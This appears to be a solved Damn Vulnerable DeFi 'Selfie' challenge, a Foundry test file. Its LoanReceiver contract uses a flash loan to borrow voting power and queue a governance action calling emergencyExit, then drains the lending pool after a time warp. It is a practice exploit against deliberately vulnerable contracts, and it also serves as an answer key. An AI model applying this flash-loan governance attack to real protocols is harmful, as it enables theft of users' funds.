// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        LoanReceiver receiver = new LoanReceiver(governance, pool);
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", address(recovery));
        uint256 amount = token.balanceOf(address(pool));

        // Make the flashloan to create an action in the governance for the emergency exit function
        pool.flashLoan(receiver, address(token), amount, data);

        // Pass two days
        vm.warp(block.timestamp + 2 days);

        // Execute action and drain the contract to the recovery account
        receiver.executeAction();
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}


contract LoanReceiver is IERC3156FlashBorrower {

    SimpleGovernance governance;
    SelfiePool pool;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 actionId;


    constructor(SimpleGovernance _governance, SelfiePool _pool){
        governance = _governance;
        pool = _pool;
    }

    function onFlashLoan(address, address _token, uint256 amount, uint256, bytes calldata data) external returns (bytes32) {
        // Need to delegate to myself because by default the token balance is not counting as voting power
        DamnValuableVotes(_token).delegate(address(this));

        actionId = governance.queueAction(address(pool), 0, data);

        DamnValuableVotes(_token).approve(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }

    function executeAction() external {
        governance.executeAction(actionId);
    }
}
